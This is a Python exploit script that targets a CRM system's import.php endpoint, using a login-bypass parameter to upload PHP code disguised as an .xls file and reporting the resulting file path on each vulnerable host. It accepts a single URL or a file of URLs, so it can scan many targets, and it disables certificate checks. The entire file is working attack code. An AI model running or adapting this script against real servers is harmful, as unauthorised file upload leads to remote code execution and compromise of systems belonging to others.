import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import re

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1")
    headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
                             'Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
               'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5'
    }
    payload = '''
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="xfile"; filename="11.xls"

<?php phpinfo();?>
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="combo"

test.php
------WebKitFormBoundarye0z8QbHs79gL8vW5--'''
    try:
        response = requests.post(target, data=payload, verify=False, headers=headers, timeout=15)
        if response.status_code == 200 and '{"success":true' in response.text:
            print(f"{url} upload success , uploadfile path : /tmpfile/test.php")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
